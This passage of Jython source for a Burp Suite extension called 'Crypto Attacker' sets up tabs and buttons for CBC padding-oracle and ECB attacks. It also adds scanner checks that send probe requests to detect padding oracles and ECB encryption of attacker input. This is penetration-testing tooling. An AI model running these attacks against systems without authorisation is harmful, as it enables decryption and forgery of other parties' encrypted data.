        ### Decrypt Padding Oracle Tab ###
        self._decryptTab = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)

        decryptButtons = swing.JPanel()
        decryptButtons.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        self._decryptTab.setLeftComponent(decryptButtons)
        decryptAddMarkButton = swing.JButton(u"Add \u00a7", actionPerformed=self.UICbcDecAddPressed)
        decryptClearMarksButton = swing.JButton(u'Clear \u00a7', actionPerformed=self.UICbcDecClearPressed)
        decryptAttackButton = swing.JButton("Attack", actionPerformed=self.paddingDecryptAttack)
        cancelAttackButton = swing.JButton("Stop", actionPerformed=self.cancelAttack)
    
        decryptButtons.add(decryptAddMarkButton)
        decryptButtons.add(decryptClearMarksButton)
        decryptButtons.add(decryptAttackButton)
        decryptButtons.add(cancelAttackButton)

        self.decryptBodies = swing.JTabbedPane()
        self._decRequestViewer = self._callbacks.createTextEditor()
        self._decResponseViewer = self._callbacks.createTextEditor()
        self._decResponseViewer.setEditable(False)
        self.decryptBodies.addTab("Request", self._decRequestViewer.getComponent())

        #output should include status, etc.
        self.decryptBodies.addTab("Output", self._decResponseViewer.getComponent())
        self._decryptTab.setRightComponent(self.decryptBodies)

        self._mainPane.addTab("CBC Decrypt", self._decryptTab)

        ### Encrypt Padding Oracle Tab ###
        self._encryptTab = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)

        encryptButtons = swing.JPanel()
        toprow = swing.JPanel()
        botrow = swing.JPanel()
        encryptButtons.setLayout(swing.BoxLayout(encryptButtons, swing.BoxLayout.Y_AXIS))

        toprow.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        botrow.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        
        encryptAddMarkButton = swing.JButton(u"Add \u00a7", actionPerformed=self.UICbcEncAddPressed)
        encryptClearMarksButton = swing.JButton(u'Clear \u00a7', actionPerformed=self.UICbcEncClearPressed)
        cbcEncryptAttackButton = swing.JButton("Attack", actionPerformed=self.paddingEncryptAttack)
        cbcEncryptCancelAttackButton = swing.JButton("Stop", actionPerformed=self.cancelAttack)

        self.plaintextisAsciiHex = swing.JCheckBox("ASCII Hex")
        plaintextlabel = swing.JLabel()
        plaintextlabel.setText("Plaintext: ")
        self.plaintextField = swing.JTextField()
        self.plaintextField.setPreferredSize(awt.Dimension(300, 30))

        toprow.add(encryptAddMarkButton)
        toprow.add(encryptClearMarksButton)
        toprow.add(cbcEncryptAttackButton)
        toprow.add(cbcEncryptCancelAttackButton)

        botrow.add(plaintextlabel)
        botrow.add(self.plaintextField)
        botrow.add(self.plaintextisAsciiHex)
        encryptButtons.add(toprow)
        encryptButtons.add(botrow)

        self._encryptTab.setLeftComponent(encryptButtons)

        self.encryptBodies = swing.JTabbedPane()
        self._encRequestViewer = self._callbacks.createTextEditor()
        self._encResponseViewer = self._callbacks.createTextEditor()
        self._encResponseViewer.setEditable(False)
        self.encryptBodies.addTab("Request", self._encRequestViewer.getComponent())

        #output should include status, etc.
        self.encryptBodies.addTab("Output", self._encResponseViewer.getComponent())
        self._encryptTab.setRightComponent(self.encryptBodies)

        self._mainPane.addTab("CBC Encrypt", self._encryptTab)

        ### ECB Decrypt Tab ###
        self._ecbDecTab = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)

        ecbDecButtons = swing.JPanel()
        ecbDecButtons.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        self._ecbDecTab.setLeftComponent(ecbDecButtons)
        ecbDecAddMarkButton = swing.JButton(u"Add \u00a7", actionPerformed=self.UIecbDecAddPressed)
        ecbDecClearMarksButton = swing.JButton(u'Clear \u00a7', actionPerformed=self.UIecbDecClearPressed)
        ecbDecAttackButton = swing.JButton("Attack", actionPerformed=self.ecbDecryptAttack) 
        cancelAttackButton = swing.JButton("Stop", actionPerformed=self.cancelAttack)

        ecbDecButtons.add(ecbDecAddMarkButton)
        ecbDecButtons.add(ecbDecClearMarksButton)
        ecbDecButtons.add(ecbDecAttackButton)
        ecbDecButtons.add(cancelAttackButton)

        self.ecbDecBodies = swing.JTabbedPane()
        self._ecbDecRequestViewer = self._callbacks.createTextEditor()
        self._ecbDecResponseViewer = self._callbacks.createTextEditor()
        self._ecbDecResponseViewer.setEditable(False)
        self.ecbDecBodies.addTab("Request", self._ecbDecRequestViewer.getComponent())

        #output should include status, etc.
        self.ecbDecBodies.addTab("Output", self._ecbDecResponseViewer.getComponent())
        self._ecbDecTab.setRightComponent(self.ecbDecBodies)

        self._mainPane.addTab("ECB Decrypt", self._ecbDecTab)

        subPane = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)
        reqPane = swing.JPanel()
        reqEditor = self._callbacks.createTextEditor()
        stupid = self._callbacks.createTextEditor()
        subPane.setRightComponent(stupid.getComponent())
        subPane.setLeftComponent(reqEditor.getComponent())
        
        # customize our UI components
        self._callbacks.customizeUiComponent(self._mainPane)
        self._callbacks.customizeUiComponent(self._optionsTab)
        self._callbacks.customizeUiComponent(self.blobEncodingTable)
        
        # add the custom tab to Burp's UI
        self._callbacks.addSuiteTab(self)
        return

    def UICbcDecAddPressed(self, stuff):
        self.UIaddMarker(self._decRequestViewer)

    def UICbcDecClearPressed(self, stuff):
        self.UIclearMarkers(self._decRequestViewer)

    def UICbcEncAddPressed(self, stuff):
        self.UIaddMarker(self._encRequestViewer)

    def UICbcEncClearPressed(self, stuff):
        self.UIclearMarkers(self._encRequestViewer)

    def UIecbDecAddPressed(self, stuff):
        self.UIaddMarker(self._ecbDecRequestViewer)

    def UIecbDecClearPressed(self, stuff):
        self.UIclearMarkers(self._ecbDecRequestViewer)

    def UIaddMarker(self, component):
        selectedBounds = component.getSelectionBounds()
        reqText = self._helpers.bytesToString(component.getText())
        if selectedBounds[0] == selectedBounds[1]:
            reqText = reqText[:selectedBounds[0]] + u"\u00a7" + reqText[selectedBounds[0]:] 
        else:
            reqText = reqText[:selectedBounds[0]] + u"\u00a7" + reqText[selectedBounds[0]:selectedBounds[1]] + u"\u00a7" + reqText[selectedBounds[1]:] 

        component.setText(reqText)
        component.setSearchExpression(u'\u00a7')
        
    def UIclearMarkers(self, component):
        selectedBounds = component.getSelectionBounds()
        reqText = self._helpers.bytesToString(component.getText())
        reqText = reqText.replace(u'\u00a7', "")
        component.setText(reqText)
        return

    def UIAddEncodingRow(self, stuff):
        model =  self.blobEncodingTable.getModel()
        #count = self.blobEncodingTable.getRowCount()
        model.addRow(["Auto (heuristics)"])
        return

    def UIDelEncodingRow(self, stuff):
        model =  self.blobEncodingTable.getModel()
        count = self.blobEncodingTable.getRowCount()
        row = self.blobEncodingTable.getSelectedRow()
        if row != -1:
            model.removeRow(row)
        elif count >= 1:
            model.removeRow(count-1)
        return

    def UIAddPaddingRow(self, stuff):
        model =  self.CBCErrorTable.getModel()
        model.addRow(["Auto (heuristics)"])
        return

    def UIDelPaddingRow(self, stuff):
        model =  self.CBCErrorTable.getModel()
        count = self.CBCErrorTable.getRowCount()
        row = self.CBCErrorTable.getSelectedRow()
        if row != -1:
            model.removeRow(row)
        elif count >= 1:
            model.removeRow(count-1)
        return

    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Crypto Attacker")

        self.addUI()

        callbacks.registerContextMenuFactory(self)
        callbacks.registerScannerCheck(self)

        return
        
    def resetValues(self):
        self.port =None
        self.host = None
        self.useHTTPS = None
        self.blocksize = 1
        self.attackInProgress = False
        self.encoding = []
        self.revEncoding = []
    
    def getTabCaption(self):
        return "Crypto Attacker"
    
    def getUiComponent(self):
        return self._mainPane
        

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        return

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        self.resetValues()
        httpservice = baseRequestResponse.getHttpService()
        self.port = httpservice.getPort()
        self.host = httpservice.getHost()
        if httpservice.getProtocol() == "https":
            self.useHTTPS = True
        else:
            self.useHTTPS = False


        issues = []
        reqinfo = self._helpers.analyzeRequest(baseRequestResponse)

        if self.activeScanPaddingOracle.isSelected():
            if self.detectPaddingOracle(baseRequestResponse, insertionPoint):
                reqresp = self._callbacks.applyMarkers(baseRequestResponse, [insertionPoint.getPayloadOffsets(insertionPoint.getBaseValue())], None)

                detail = "The application appears to have a padding oracle. This parameter can be arbitrarily encrypted/decrypted. This might indicate a padding error under the following conditions: <br /><br />"
                detail += self.cbcErrors[0][0] + " " + self.cbcErrors[0][1]
                issue = CustomScanIssue(httpservice, reqinfo.getUrl(), [reqresp], "Padding Oracle",  detail, "Firm", "High")
                issues.append(issue)


        if self.activeScanECB.isSelected():
            #96 is enough for 3 256 bit blocks, and should repeat
            origResp = self._helpers.bytesToString(baseRequestResponse.getResponse())
            ecbReq = insertionPoint.buildRequest(self._helpers.stringToBytes("G" * 96))
            ecbResp = self._helpers.bytesToString(self._callbacks.makeHttpRequest(httpservice, ecbReq).getResponse())

            skipECBCheck = False

            if len(ecbResp) < len(origResp) + (90*2):
                skipECBCheck = True

            if not skipECBCheck:
                blobRegex = r"[A-Za-z0-9+/=]{32}[A-Za-z0-9+/=]*"

                origRespBlobs = re.findall(blobRegex, origResp)
                ecbRespBlobs = re.findall(blobRegex, ecbResp)

                for blob in ecbRespBlobs:
                    if blob not in origRespBlobs and self.guessEncoding(blob):
                        rblob = self.decodeBlob(blob)
                        if self.ecbGetBlocksize(rblob) != -1:
                            reqinfo = self._helpers.analyzeRequest(baseRequestResponse)
                            reqresp = self._callbacks.applyMarkers(baseRequestResponse, [insertionPoint.getPayloadOffsets(insertionPoint.getBaseValue())], None)

                            detail = "The application appears to encrypt attacker controlled text with ECB. The following blob is found in a response with a long repeating parameter. It appears to be encoded as " 
                            detail += self.encoding[0] +" and have repeating blocks. Anything else encrypted with this key would be decryptable/encryptable.<br /><br />"
                            detail += "New Input (plaintext): " + "G" * 96 + "<br />New " + self.encoding[0] + " blob in resp with repeating blocks: " + blob
                            issue = CustomScanIssue(httpservice, reqinfo.getUrl(), [reqresp], "ECB with Attacker input",  detail, "Firm", "High")
                            issues.append(issue)

        return issues

    def detectPaddingOracle(self, baseRequestResponse, insertionPoint):
        blob = insertionPoint.getBaseValue()
        if blob == "":
            return False

        #tmark is url encoding safe
        tmark = "95f9c35e-8a5f-4ca8-b0a4-4b2907ce0675"
        payload = tmark + blob + tmark

        #req needs to be modified to our kludgy format because our attack doesn't have "insertionpoints"
        req = insertionPoint.buildRequest(self._helpers.stringToBytes(payload))
        req = self._helpers.bytesToString(req).replace(tmark, u"\u00a7")

        if not self.initConfig(req, blob):
            return False
        return True

    def ecbGetBlocksize(self, blob):
        datasplit = []
        elem = ""
        for i in range(0,len(blob)):
            elem += chr(blob[i])
            if len(elem) % 8 == 0:
                datasplit.append(elem)
                elem = ""


        for i in range(0, len(datasplit)):
            if datasplit.count(datasplit[i]) > 1:
                return 16
                #separate for loop because this is slower than count (and has to run much less often I think)
                for j in range(i+1, len(datasplit)):
                    if datasplit[i]== datasplit[j]:
                        return (j-i) * 8
        return -1


    #Given a new response, reqturns the blob of enc(something | controlled | something)
    #TODO needs to respect config options
    def extractRepeatingBlock(self, initResp, newResp):
        #todo {16} can be len(longblob) - should configure this better instead of hardcoding 96
        blobRegex = r"[A-Za-z0-9+/=]{96}[A-Za-z0-9+/=]*"

        origRespBlobs = re.findall(blobRegex, initResp)
        ecbRespBlobs = re.findall(blobRegex, newResp)

        for blob in ecbRespBlobs:
            if blob not in origRespBlobs and self.guessEncoding(blob):
                blob = self.decodeBlob(blob)
                if self.ecbGetBlocksize(blob) != -1:
                    return blob


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail + '<br/><br/><div style="font-size:8px">This issue was reported by CryptoAttacker</div>'
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: "+name+" on "+str(url)
        return
    
    def getUrl(self):
        return self.Url
     
    def getIssueName(self):
        return self.Name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self.Severity
    
    def getConfidence(self):
        return self.Confidence
    
    def getIssueBackground(self):
        return None
    
    def getRemediationBackground(self):
        return None
    
    def getIssueDetail(self):
        return self.Detail
    
    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages
    
    def getHttpService(self):
        return self.HttpService